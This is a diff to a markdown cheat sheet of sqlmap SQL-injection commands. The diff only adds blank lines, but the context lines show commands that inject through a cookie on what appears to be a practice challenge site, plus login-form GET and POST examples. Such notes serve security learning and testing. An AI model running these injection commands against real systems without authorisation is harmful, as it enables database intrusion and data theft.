@@ -38,6 +38,7 @@ Create a tamper script called "mytamper.py" in the /usr/share/sqlmap/tamper
 
 <pre>sqlmap -u "http://2.challenge.sqli.site/view_book.php?id=3" --cookie="userchl2_info=" -p userchl2_info --level=2 --dbms=mysql --tamper=mytamper --banner</pre>
 
+
 **Get Req Example**
 <pre>sqlmap -u "url/ajax.php?fun=login&username=test&password=test" --keep-alive</pre>
 
@@ -45,6 +46,7 @@ Create a tamper script called "mytamper.py" in the /usr/share/sqlmap/tamper
 
 <pre>sqlmap  -u "url" 
 --data="fun=login&username=test&password=test"</pre>
+
 
 # Switches
 
